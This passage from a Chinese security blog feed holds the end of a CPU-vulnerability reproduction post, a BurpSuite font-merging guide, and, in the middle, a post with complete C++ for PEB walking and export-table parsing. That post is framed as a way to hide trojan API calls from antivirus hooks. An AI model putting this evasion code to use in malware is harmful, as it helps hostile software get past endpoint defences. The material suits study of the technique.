class="hljs-comment"># 获取secret_ptr</span><br><span class="hljs-built_in">cd</span> ../zen_1_2<br>./inception 0x&lt;secret_ptr&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1752763688641-1a9e0d4b-f603-4d0e-9eab-e97e0ac8eba2.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>科研工作</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CPU</tag>
      
      <tag>漏洞复现</tag>
      
      <tag>处理器漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>免入土（五）绕过 IAT Hook / Inline Hook 实现SafeGetProcAddress</title>
    <link href="/2025/07/13/%E5%85%8D%E5%85%A5%E5%9C%9F%EF%BC%88%E4%BA%94%EF%BC%89%E7%BB%95%E8%BF%87-IAT-Hook-Inline-Hook-%E5%AE%9E%E7%8E%B0SafeGetProcAddress/"/>
    <url>/2025/07/13/%E5%85%8D%E5%85%A5%E5%9C%9F%EF%BC%88%E4%BA%94%EF%BC%89%E7%BB%95%E8%BF%87-IAT-Hook-Inline-Hook-%E5%AE%9E%E7%8E%B0SafeGetProcAddress/</url>
    
    <content type="html"><![CDATA[<h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><p>无论是刚学习免杀对抗的时候，还是再后期制作免杀木马的时候，都难免接触到一些名词，如自实现 API、IAT 绕过等等，说的都是关于 Windows 官方的 API，这些 API 函数最后会呈现在导入表中，容易被杀软检测。</p><p>在日常开发免杀木马的时候，想要动态调用模块里的函数，一般都是通过<code>LoadLibrary</code> 加载模块，再使用<code>GetProcAddress</code> 根据名字获取函数地址进行调用，这就十分容易被杀软 hook 检测。<br>为了对抗安全检测、避免被 Hook，就可以通过以下的流程手动解析已加载的模块获取相应函数的地址：</p><ol><li>在当前进程中找到指定模块（如 ntdll.dll）的基址，遍历 PEB 里的模块链表</li><li>根据模块基址找到导出表（Export Directory），PE 文件结构中有专门的数据目录指向导出表</li><li>找到目标函数名，得到其 ordinal（序号），根据序号取到真实函数地址（RVA + 模块基址）</li></ol><p>通过上述流程解析得到的函数地址：</p><ol><li>绕过 IAT Hook &#x2F; Inline Hook</li><li>无需调用任何额外 API，更隐蔽</li></ol><p>本文通过封装了一个 SafeGetProcAddress 函数去获取指定模块的指定函数的地址，最终获取的地址 GetProcAddress 一致。</p><h1 id="二、具体实现"><a href="#二、具体实现" class="headerlink" title="二、具体实现"></a>二、具体实现</h1><h2 id="2-1-获取模块：PEB-结构与遍历"><a href="#2-1-获取模块：PEB-结构与遍历" class="headerlink" title="2.1 获取模块：PEB 结构与遍历"></a>2.1 获取模块：PEB 结构与遍历</h2><p>每个 Windows 进程都有一个 PEB（Process Environment Block），它记录了进程里所有已加载的模块。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_PEB</span> &#123;<br>  BYTE                          Reserved1[<span class="hljs-number">2</span>];<br>  BYTE                          BeingDebugged;<br>  BYTE                          Reserved2[<span class="hljs-number">1</span>];<br>  PVOID                         Reserved3[<span class="hljs-number">2</span>];<br>  PPEB_LDR_DATA                 Ldr;<br>  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;<br>  PVOID                         Reserved4[<span class="hljs-number">3</span>];<br>  PVOID                         AtlThunkSListPtr;<br>  PVOID                         Reserved5;<br>  ULONG                         Reserved6;<br>  PVOID                         Reserved7;<br>  ULONG                         Reserved8;<br>  ULONG                         AtlThunkSListPtr32;<br>  PVOID                         Reserved9[<span class="hljs-number">45</span>];<br>  BYTE                          Reserved10[<span class="hljs-number">96</span>];<br>  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;<br>  BYTE                          Reserved11[<span class="hljs-number">128</span>];<br>  PVOID                         Reserved12[<span class="hljs-number">1</span>];<br>  ULONG                         SessionId;<br>&#125; PEB, *PPEB;<br></code></pre></td></tr></table></figure><p>其中：</p><ul><li><code>Ldr</code> 指向 <code>PEB_LDR_DATA</code>，记录模块链表</li><li><code>InMemoryOrderModuleList</code>：链表中每个节点是 <code>LDR_DATA_TABLE_ENTRY</code></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_PEB_LDR_DATA</span> &#123;<br>  BYTE       Reserved1[<span class="hljs-number">8</span>];<br>  PVOID      Reserved2[<span class="hljs-number">3</span>];<br>  LIST_ENTRY InMemoryOrderModuleList;<br>&#125; PEB_LDR_DATA, *PPEB_LDR_DATA;<br></code></pre></td></tr></table></figure><p>如何获取 PEB：</p><ul><li>x64：<code>__readgsqword(0x60)</code></li><li>x86：<code>__readfsdword(0x30)</code></li></ul><p>遍历链表：</p><ul><li>比对 <code>FullDllName</code>（模块全名）</li><li>找到目标模块后返回 <code>DllBase</code>（模块基址）</li></ul><p>关键代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">HMODULE <span class="hljs-title">GetModuleByPEB</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* targetName)</span> </span>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _M_X64</span><br>    PPEB pPEB = (PPEB)__readgsqword(<span class="hljs-number">0x60</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    PPEB pPEB = (PPEB)__readfsdword(<span class="hljs-number">0x30</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    PPEB_LDR_DATA pLdr = pPEB-&gt;Ldr;<br>    PLIST_ENTRY moduleList = &amp;pLdr-&gt;InMemoryOrderModuleList;<br>    PLIST_ENTRY pStartListEntry = moduleList-&gt;Flink;<br><br>    <span class="hljs-keyword">for</span> (PLIST_ENTRY pListEntry = pStartListEntry; pListEntry != moduleList; pListEntry = pListEntry-&gt;Flink) &#123;<br>        PLDR_DATA_TABLE_ENTRY pEntry = <span class="hljs-built_in">CONTAINING_RECORD</span>(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);<br>        <span class="hljs-comment">// 比对模块名</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-2-解析导出表：根据名字找到函数地址"><a href="#2-2-解析导出表：根据名字找到函数地址" class="headerlink" title="2.2 解析导出表：根据名字找到函数地址"></a>2.2 解析导出表：根据名字找到函数地址</h2><p>拿到模块基址后，能够根据 PE 结构找到模块里指定的函数。  </p><ol><li>从基址找到 PE 文件的 NT 头：</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;<br>PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader-&gt;e_lfanew);<br></code></pre></td></tr></table></figure><ol><li>找到导出表：</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">DWORD exportDirRVA = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;<br>PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDirRVA);<br></code></pre></td></tr></table></figure><ol><li>遍历导出表：</li></ol><ul><li><code>AddressOfNames</code>：所有导出函数名字的 RVA 数组</li><li><code>AddressOfNameOrdinals</code>：与名字对应的序号</li><li><code>AddressOfFunctions</code>：函数地址的 RVA 数组</li></ul><ol><li>找到名字对应的 ordinal，再找到真实地址：</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; exportDir-&gt;NumberOfNames; ++i) &#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* funcName = (<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)hModule + nameRVAs[i];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(funcName, lpProcName) == <span class="hljs-number">0</span>) &#123;<br>        WORD ordinal = nameOrdinals[i];<br>        <span class="hljs-keyword">return</span> (FARPROC)((BYTE*)hModule + functions[ordinal]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-3-封装-Api：SafeGetProcAddress"><a href="#2-3-封装-Api：SafeGetProcAddress" class="headerlink" title="2.3 封装 Api：SafeGetProcAddress"></a>2.3 封装 Api：SafeGetProcAddress</h2><p>把上面两个功能组合：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">FARPROC <span class="hljs-title">SafeGetProcAddress</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* moduleName, LPCSTR apiName)</span> </span>&#123;<br>    HMODULE hMod = <span class="hljs-built_in">GetModuleByPEB</span>(moduleName);<br>    <span class="hljs-keyword">if</span> (!hMod) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">ParseExportByName</span>(hMod, apiName);<br>&#125;<br></code></pre></td></tr></table></figure><p>现在就能：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> pNtCreateFile = <span class="hljs-built_in">SafeGetProcAddress</span>(<span class="hljs-string">L&quot;ntdll.dll&quot;</span>, <span class="hljs-string">&quot;NtCreateFile&quot;</span>);<br></code></pre></td></tr></table></figure><p>无须 LoadLibrary，也不走官方 GetProcAddress。</p><h1 id="三、最终实现"><a href="#三、最终实现" class="headerlink" title="三、最终实现"></a>三、最终实现</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;safeApi.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winternl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _MSC_VER</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;ntdll.lib&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cwchar&gt;</span></span><br><br><br><span class="hljs-function">HMODULE <span class="hljs-title">GetModuleByPEB</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* targetName)</span> </span>&#123;<br>    <span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _M_X64</span><br>    PPEB pPEB = (PPEB)__readgsqword(<span class="hljs-number">0x60</span>);<br>    <span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    PPEB pPEB = (PPEB)__readfsdword(<span class="hljs-number">0x30</span>);<br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    PPEB_LDR_DATA pLdr = pPEB-&gt;Ldr;<br>    PLIST_ENTRY moduleList = &amp;pLdr-&gt;InMemoryOrderModuleList;<br>    PLIST_ENTRY pStartListEntry = moduleList-&gt;Flink;<br><br>    <span class="hljs-keyword">for</span> (PLIST_ENTRY pListEntry = pStartListEntry; pListEntry != moduleList; pListEntry = pListEntry-&gt;Flink) &#123;<br>        PLDR_DATA_TABLE_ENTRY pEntry = <span class="hljs-built_in">CONTAINING_RECORD</span>(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);<br>        <span class="hljs-type">wchar_t</span>* dllName = pEntry-&gt;FullDllName.Buffer;<br>        <span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* currentFileName = <span class="hljs-built_in">wcsrchr</span>(dllName, <span class="hljs-string">L&#x27;\\&#x27;</span>); <span class="hljs-comment">// 获取dll文件名</span><br>        <span class="hljs-keyword">if</span> (currentFileName) &#123;<br>            currentFileName++;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            currentFileName = dllName;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (currentFileName) &#123;<br>            <span class="hljs-keyword">if</span> (_wcsnicmp(currentFileName, targetName, <span class="hljs-built_in">wcslen</span>(targetName)) == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// 比较dll文件名(不区分大小写)</span><br>                <span class="hljs-keyword">return</span> (HMODULE)pEntry-&gt;DllBase;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-function">FARPROC <span class="hljs-title">ParseExportByName</span><span class="hljs-params">(HMODULE hModule, LPCSTR lpProcName)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!hModule || !lpProcName)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;<br>    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader-&gt;e_lfanew);<br><br>    DWORD exportDirRVA = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;<br>    <span class="hljs-keyword">if</span> (!exportDirRVA) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportDirRVA);<br>    DWORD* functions = (DWORD*)((BYTE*)hModule + exportDir-&gt;AddressOfFunctions);<br><br><br>    <span class="hljs-keyword">if</span> ((ULONG_PTR)lpProcName &lt;= <span class="hljs-number">0xFFFF</span>) &#123;<br>        WORD ordinal = (WORD)(ULONG_PTR)lpProcName;<br>        WORD baseOrdinal = (WORD)exportDir-&gt;Base;<br>        <span class="hljs-keyword">if</span> (ordinal &lt; baseOrdinal || ordinal &gt;= baseOrdinal + exportDir-&gt;NumberOfFunctions) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <br>        &#125;<br>        <span class="hljs-keyword">return</span> (FARPROC)((BYTE*)hModule + functions[ordinal - baseOrdinal]);<br>    &#125;<br><br><br>    DWORD* nameRVAs = (DWORD*)((BYTE*)hModule + exportDir-&gt;AddressOfNames);<br>    WORD* nameOrdinals = (WORD*)((BYTE*)hModule + exportDir-&gt;AddressOfNameOrdinals);<br><br>    <span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; exportDir-&gt;NumberOfNames; ++i) &#123;<br>        <span class="hljs-type">const</span> <span class="hljs-type">char</span>* funcName = (<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)hModule + nameRVAs[i];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(funcName, lpProcName) == <span class="hljs-number">0</span>) &#123;<br>            WORD ordinal = nameOrdinals[i];<br>            <span class="hljs-keyword">return</span> (FARPROC)((BYTE*)hModule + functions[ordinal]);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-function">FARPROC <span class="hljs-title">SafeGetProcAddress</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* moduleName, LPCSTR apiName)</span> </span>&#123;<br>    HMODULE hMod = <span class="hljs-built_in">GetModuleByPEB</span>(moduleName);<br>    <span class="hljs-keyword">if</span> (!hMod) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">ParseExportByName</span>(hMod, apiName);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/ns-winternl-peb">https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/ns-winternl-peb</a></li><li><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/ns-winternl-peb_ldr_data">https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/ns-winternl-peb_ldr_data</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>免杀对抗</category>
      
    </categories>
    
    
    <tags>
      
      <tag>免杀对抗</tag>
      
      <tag>Windows Api</tag>
      
      <tag>IAT Hook</tag>
      
      <tag>Inline Hook</tag>
      
      <tag>Bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解决Windows系统BurpSuite中文显示框框&lt;口口&gt;</title>
    <link href="/2025/07/07/%E8%A7%A3%E5%86%B3Windows%E7%B3%BB%E7%BB%9FBurpSuite%E4%B8%AD%E6%96%87%E6%98%BE%E7%A4%BA%E6%A1%86%E6%A1%86-%E5%8F%A3%E5%8F%A3/"/>
    <url>/2025/07/07/%E8%A7%A3%E5%86%B3Windows%E7%B3%BB%E7%BB%9FBurpSuite%E4%B8%AD%E6%96%87%E6%98%BE%E7%A4%BA%E6%A1%86%E6%A1%86-%E5%8F%A3%E5%8F%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h1><p>本文的主要目的就是为了<strong>彻底性的解决 Windows 系统 burpsuite 中文显示框框&lt;口口&gt;的问题</strong>（任何字体均能够显示中文，不强制要求某种字体）。</p><p>不想自己做字体的，也有我这边做好的，放文章末尾了，自行下载按照第四章节替换系统字体即可；</p><p>对了，Mac 没有这种问题哟，Mac 各方面上都太优秀了（除了不能畅玩游戏）</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1751891047954-e9a4d7f1-b6a6-453b-8e19-658fc5b65c43.png" alt="img"></p><p>这时候有人几句要说了，“改成能够显示中文的字体不就行了吗？”“用 yakit 不就好了吗？”，抱有这些想法的人，估计也翻不到这篇文章吧。</p><p>为什么要解决这个看似微小的问题？</p><p>因为，这个问题对我来说非常重要！能够显示中文的字体，如黑体、宋体等，在显示英文字母上真是丑到爆炸，严重 影响攻防渗透体验，可以说让我没有了打开 burpsuite 的欲望；能让英文字母显示好看的字体，如 Cascadia，在显示中文上又是框框口口的问题，在攻防渗透过程中有会丢失部分信息真的很苦恼。</p><p>因此，本文实现的效果就是能在Cascadia 字体上仍然能够正常地显示中文（中文是否好看不要紧，重要是能显示，因为中文在数据包的占比还是比较少的，能够读取信息即可）</p><blockquote><p>update: 最后使用Cascadia Code + 黑体实现了巨优秀（无错乱等）的字体显示，字体也放到网盘里边，请自取！</p></blockquote><h1 id="二、Burpsuite-中文显示框框的原因"><a href="#二、Burpsuite-中文显示框框的原因" class="headerlink" title="二、Burpsuite 中文显示框框&lt;口口&gt;的原因"></a>二、Burpsuite 中文显示框框&lt;口口&gt;的原因</h1><p>这个原因其实很简单，就是在 burpsuite 中设置显示的那个字体<strong>没有中文的适配性</strong>，即<strong>没有融入中文字体</strong>。<br>可以通过将框框&lt;口口&gt;复制到其他地方，可以看到框框的正确内容。</p><p>因此，只要让相应的字体融入中文就好了，下面直接教大家怎么做自己想要的字体；</p><h1 id="三、自定义字体的制作"><a href="#三、自定义字体的制作" class="headerlink" title="三、自定义字体的制作"></a>三、自定义字体的制作</h1><h2 id="3-1-工具和效果展示"><a href="#3-1-工具和效果展示" class="headerlink" title="3.1 工具和效果展示"></a>3.1 工具和效果展示</h2><p>制作字体需要用到一款工具<code>FontForge</code>，下载链接：<a href="https://fontforge.org/">https://fontforge.org/</a></p><p>理论上，可以融合任何字体，但是我不太建议使用一些奇奇怪怪的字体，因为可能也会导致 burpsuite 无法识别，或者导致 burpsuite 光标偏移的问题；尝试过使用<code>SF-Mono + 苹方</code>（Mac 的字体），最后指针偏移了，暂时没找到解决办法（设置那个系统匹配性不行哈，不用试了）；</p><p>本文采用将<code>Cascadia Code + 微软雅黑</code>实现显示中文，其他字体的修改思想一致，看着改就行；</p><p>最终效果如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1751891416862-81f23446-062c-4219-acb3-d8efaf7cd3f7.png" alt="img"></p><p>这样子确实存在一点小问题，但是不碍事，能用辣。</p><p>可以看到“到”字的显示存在一些问题，还有其他的一些问题也存在这种问题，如“不”等等</p><h2 id="3-2-字体制作"><a href="#3-2-字体制作" class="headerlink" title="3.2 字体制作"></a>3.2 字体制作</h2><h3 id="1-准备字体"><a href="#1-准备字体" class="headerlink" title="1. 准备字体"></a>1. 准备字体</h3><p>首先我们从系统字体中提取出<code>Cascadia Code</code>和<code>微软雅黑</code>中的<code>Regular(常规)</code>字体（Burpsuite 一般只允许使用 Regular，以及个别字体的 SemiBold）；</p><p>系统字体存放的位置在：<code>C:\Windows\Fonts\</code></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1751891945869-74e71a16-e118-4bfa-8234-f34ecfefa8f1.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1751892119582-a87759dc-3ccd-46b1-b715-0e8eebcd7524.png" alt="img"></p><h3 id="2-打开字体查看属性并修改"><a href="#2-打开字体查看属性并修改" class="headerlink" title="2. 打开字体查看属性并修改"></a>2. 打开字体查看属性并修改</h3><p>我融合的字体大小是一致的，不需要修改。对于其他的一些大小不一致的字体则需要修改</p><p>使用<code>FontForge</code>工具打开两个字体查看它们的属性它们的大小是否一致；</p><p>打开字体后，依次点击<code>Element</code>-&gt;<code>Font Info</code>-&gt;<code>General</code>查看<code>Em Size</code>是否一致；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1751892900885-5048e960-bcb0-43f1-befe-df12d537cee7.png" alt="img"></p><p>如果两个字体的大小不一致，首先将其中一个字体的大小调整到与另一个字体大小相等导出；（一致则不需要调整）</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1751893058181-e94ac773-35dd-49ec-89e7-becb804c734a.png" alt="img"></p><p>点击 ok 以后，依次点击<code>File</code>-&gt;<code>Generalte Fonts</code></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1751893108550-5b75afe0-f852-43a6-99ba-178a31565029.png" alt="img"></p><p>点击以后，取消保存有效性检查，并将字体类型修改为<code>TrueType</code>，然后点击生成<code>Generate</code>得到一个新的字体， 使用这个新的字体进行后续的融合步骤；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1751893154690-bbe87bb1-0087-485b-b014-c10ac8e1b461.png" alt="img"></p><h3 id="3-融合字体"><a href="#3-融合字体" class="headerlink" title="3. 融合字体"></a>3. 融合字体</h3><p>由于我们字体的大小一致，所以不需要对字体进行修改</p><p>首先使用<code>FontForge</code>打开英文字体<code>CASCADIACODE.TTF</code>，可能会有一些错误，但不要紧。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1751893409388-5caec46c-6b07-4aa2-b78b-478f992bada1.png" alt="img"></p><p>关掉错误，然后依次点击<code>Element</code>-&gt;<code>Merge Fonts</code></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1751893457143-746d08f8-5bd2-47b9-9881-58d1005ed365.png" alt="img"></p><p>然后选中我们计划融合的中文字体打开即可</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1751893502054-02bbb3af-8537-4940-8af5-1ecf8878979a.png" alt="img"></p><p>这里建议选 <code>No</code>，这个貌似是设置第二个字体的间距的是不是要按照第一种字体进行设置的（反正选 no 能够达到很好的效果）</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1751893526639-588f68a5-b022-4674-ba39-359d26807e55.png" alt="img"></p><p>合并完成以后，将字体保存即可；</p><p>依次点击<code>File</code>-&gt;<code>Generate Fonts</code></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1751893624083-e6a9fcb0-7009-4973-af16-98fc45ece0ad.png" alt="img"></p><p>然后依次取消有效性选择<code>Validate Before Saving</code>，并修改保存字体类型为<code>TrueType</code>然后点击<code>Generate</code>即可。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1751893662237-e80d3077-0d57-4aac-b28a-f148d07c2ca7.png" alt="img"></p><p>至此，我们字体合并的部分就已经解决了</p><h1 id="四、字体替换"><a href="#四、字体替换" class="headerlink" title="四、字体替换"></a>四、字体替换</h1><p>这部分的内容主要是针对我们合并的字体是系统自带字体，这种我们会发现，我们直接安装字体是无法将字体直接替换系统字体的，在 burpsuite 中依然显示框框&lt;口口&gt;；</p><p>这里我们打开设置，搜索<code>字体</code>，打开<code>字体设置</code>，在搜索<code>cas</code>，打开<code>Cascadia Code</code></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1751893918310-a55011b3-1720-4187-86f1-53ae3d926f7e.png" alt="img"></p><p>滑到下面，选中上面那个<code>Regular</code>类型字体，点击 卸载；（别担心，下面那个你卸不了）</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1751894207205-99111465-754d-4d38-84bd-05dedee5ffab.png" alt="img"></p><p>卸载完以后，你在打开 burpsuite 设置字体，你会发现<code>Cascadia Code</code>字体没了；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1751894356383-b7f3424e-14ab-48d2-b1d5-d107b87fe829.png" alt="img"></p><p>这时，在将我们合并得到的字体安装回去，就可以发现一个新的字体<code>Roman</code></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1751894448011-e1107064-b11c-417c-a1b2-4a8dc7d55994.png" alt="img"></p><p>这时，我们在打开 burpsuit 进行字体设置，就可以发现我们安装的字体<code>Cascadia Code</code>了；效果非常好；</p><p><img 